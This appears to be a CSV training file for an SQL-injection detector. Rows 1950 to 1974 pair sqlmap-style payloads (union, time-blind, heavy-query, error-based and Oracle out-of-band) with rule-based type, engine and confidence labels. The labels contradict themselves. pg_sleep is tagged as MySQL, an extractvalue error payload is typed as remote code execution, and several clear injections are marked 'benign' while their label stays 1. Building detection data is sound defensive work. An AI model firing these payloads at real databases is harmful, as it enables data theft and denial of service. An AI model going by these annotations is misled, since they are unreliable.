row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
1950,"-4535' ) union all select 8491,8491,8491,8491,8491,8491--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1951,"1%' ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( '%' = '",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
1952,1' and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and 'lqsa' like 'lqsa,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
1953,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 'gsdq' = 'gsdq",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
1954,"1%' ) ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
1955,"-1684"" ) ) ) union all select 7473,7473#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1956,"1%"" ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
1957,1 where 8921 = 8921 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1958,"-7683"" ) where 9664 = 9664 union all select 9664,9664,9664,9664,9664,9664,9664#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1959,select sleep ( 5 ) and ( 'labj' = 'labj,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1960,"-4592"" ) ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( ( ""xvpz"" = ""xvpz",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
1961,-5547' or 9323 = 9323#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1962,"1' ) ) ) or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( 'qvqf' = 'qvqf",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
1963,"1 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) -- zozj",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
1964,"-4641"" ) where 4212 = 4212 or make_set ( 3595 = 4062,4062 ) --",1,,boolean_blind,generic,0.95,4212 = 4212 or detected — boolean_blind injection (priority 8) on generic,rule-based
1965,"1"" ) ) ) or sleep ( 5 ) and ( ( ( ""eran"" = ""eran",1,,time_blind,mysql,0.95,"sleep (, or sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
1966,"1"" or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) )",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
1967,1'+ ( select gqez where 3704 = 3704,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1968,"1' ) as ycsr where 2238 = 2238 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
1969,"-1558 or elt ( 3306 = 2272,2272 ) -- ioxt",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1970,"1 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) -- zimf",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1971,1 ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ),1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1972,"( convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 9339 = 9339 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) )",1,,error_based,generic,0.95,convert ( int detected — error_based injection (priority 4) on generic,rule-based
1973,1'|| ( select 'oxas' from dual where 8284 = 8284 or sleep ( 5 ) ) ||',1,,time_blind,mysql,0.95,"sleep (, or sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
1974,select case when 3076 = 1605 then 1 else null end--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
